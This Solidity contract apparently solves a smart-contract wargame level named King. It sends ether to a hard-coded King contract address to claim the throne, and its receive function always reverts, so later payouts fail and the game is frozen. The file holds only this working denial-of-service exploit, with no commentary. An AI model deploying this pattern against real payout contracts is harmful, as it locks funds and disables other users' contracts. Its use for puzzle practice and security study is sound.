// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./King.sol";
contract BeKing{

    King public king = King(0xA15b1C7B6ae101a76F9432021872099f5296A4fD);

    constructor() public {
    }
    function becomeKing() public payable {
        (bool sent, ) = address(king).call.value(msg.value)("");
        require(sent, "Failed to send value!");
    }
    receive() external payable {
        revert("not happening");
    }    
}